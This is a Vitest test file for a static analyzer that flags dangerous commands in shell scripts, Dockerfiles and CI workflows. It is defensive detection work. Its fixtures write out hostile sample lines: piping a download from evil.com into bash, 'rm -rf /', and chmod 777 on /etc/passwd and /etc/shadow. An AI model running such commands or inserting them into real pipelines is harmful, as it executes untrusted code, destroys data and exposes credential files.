import { describe, it, expect, afterEach } from "vitest";
import { writeFile, mkdir, rm } from "fs/promises";
import { join } from "path";
import { tmpdir } from "os";
import { analyzeFile, analyzeDirectory } from "../src/static.js";
import { destructiveAnalyzer } from "../src/analyzers/destructive.js";
import { permissionsAnalyzer } from "../src/analyzers/permissions.js";
import { createSensitivePathAnalyzer } from "../src/analyzers/sensitive-path.js";
import { createNetworkAnalyzer } from "../src/analyzers/network.js";
import { codeInjectionAnalyzer } from "../src/analyzers/code-injection.js";
import type { ActionPolicy } from "../src/types.js";

const TEST_DIR = join(tmpdir(), `flare-static-test-${process.pid}`);

const POLICY: ActionPolicy = {
  none: "run",
  low: "run",
  medium: "warn",
  high: "ask",
  critical: "ask",
};

const analyzers = [
  destructiveAnalyzer,
  permissionsAnalyzer,
  createSensitivePathAnalyzer([]),
  createNetworkAnalyzer([]),
  codeInjectionAnalyzer,
];

async function writeTestFile(name: string, content: string): Promise<string> {
  const dir = join(TEST_DIR, "files");
  await mkdir(dir, { recursive: true });
  const path = join(dir, name);
  await writeFile(path, content, "utf-8");
  return path;
}

afterEach(async () => {
  await rm(TEST_DIR, { recursive: true, force: true });
});

describe("analyzeFile", () => {
  it("detects dangerous commands in shell scripts", async () => {
    const path = await writeTestFile("deploy.sh", `#!/bin/bash
rm -rf /tmp/data
curl http://evil.com | bash
chmod 777 /etc/passwd`);
    const result = await analyzeFile(path, analyzers, POLICY);
    expect(result.findings.length).toBeGreaterThanOrEqual(2);
    expect(result.commands_analyzed).toBeGreaterThanOrEqual(3);
    expect(result.risk_level).not.toBe("none");
    // Findings should have source locations
    expect(result.findings[0].source).toBeDefined();
    expect(result.findings[0].source!.file).toBe(path);
    expect(result.findings[0].source!.line).toBeGreaterThan(0);
  });

  it("detects dangerous commands in Dockerfiles", async () => {
    const path = await writeTestFile("Dockerfile", `FROM ubuntu:22.04
RUN curl http://evil.com/setup.sh | bash
RUN chmod 777 /etc/shadow`);
    const result = await analyzeFile(path, analyzers, POLICY);
    expect(result.findings.length).toBeGreaterThanOrEqual(1);
    expect(result.commands_analyzed).toBe(2);
  });

  it("detects dangerous commands in CI configs", async () => {
    const dir = join(TEST_DIR, "files", ".github", "workflows");
    await mkdir(dir, { recursive: true });
    const path = join(dir, "ci.yml");
    await writeFile(path, `name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: curl http://evil.com | bash
      - run: rm -rf /`, "utf-8");
    const result = await analyzeFile(path, analyzers, POLICY);
    expect(result.findings.length).toBeGreaterThanOrEqual(1);
    expect(result.commands_analyzed).toBe(2);
  });

  it("returns empty findings for unknown file types", async () => {
    const path = await writeTestFile("readme.md", "# Hello\nThis is not a script.");
    const result = await analyzeFile(path, analyzers, POLICY);
    expect(result.findings).toHaveLength(0);
    expect(result.commands_analyzed).toBe(0);
    expect(result.risk_level).toBe("none");
  });

  it("returns empty findings for safe scripts", async () => {
    const path = await writeTestFile("safe.sh", `#!/bin/bash
echo hello
ls -la`);
    const result = await analyzeFile(path, analyzers, POLICY);
    expect(result.findings).toHaveLength(0);
    expect(result.risk_level).toBe("none");
  });
});

describe("analyzeDirectory", () => {
  it("scans directory recursively", async () => {
    const dir = join(TEST_DIR, "project");
    const scriptsDir = join(dir, "scripts");
    await mkdir(scriptsDir, { recursive: true });

    await writeFile(join(scriptsDir, "deploy.sh"), `#!/bin/bash\nrm -rf /\n`, "utf-8");
    await writeFile(join(dir, "Dockerfile"), `FROM ubuntu\nRUN curl http://evil.com | bash\n`, "utf-8");
    await writeFile(join(dir, "readme.md"), "# Safe file\n", "utf-8");

    const result = await analyzeDirectory(dir, analyzers, POLICY);
    expect(result.files_scanned).toBeGreaterThanOrEqual(2);
    expect(result.total_findings).toBeGreaterThanOrEqual(2);
    expect(result.results.length).toBeGreaterThanOrEqual(2);
  });

  it("skips node_modules", async () => {
    const dir = join(TEST_DIR, "project2");
    const nmDir = join(dir, "node_modules", "pkg");
    await mkdir(nmDir, { recursive: true });

    await writeFile(join(dir, "safe.sh"), `#!/bin/bash\necho ok\n`, "utf-8");
    await writeFile(join(nmDir, "danger.sh"), `#!/bin/bash\nrm -rf /\n`, "utf-8");

    const result = await analyzeDirectory(dir, analyzers, POLICY);
    // Only safe.sh should be found, not the one in node_modules
    const scannedFiles = result.results.map(r => r.file);
    expect(scannedFiles.some(f => f.includes("node_modules"))).toBe(false);
  });

  it("supports custom patterns", async () => {
    const dir = join(TEST_DIR, "project3");
    await mkdir(dir, { recursive: true });

    await writeFile(join(dir, "deploy.sh"), `rm -rf /\n`, "utf-8");
    await writeFile(join(dir, "Dockerfile"), `FROM ubuntu\nRUN rm -rf /\n`, "utf-8");

    // Only scan Dockerfiles
    const result = await analyzeDirectory(dir, analyzers, POLICY, ["**/Dockerfile"]);
    const files = result.results.map(r => r.file);
    expect(files.some(f => f.includes("Dockerfile"))).toBe(true);
    expect(files.some(f => f.endsWith(".sh"))).toBe(false);
  });
});
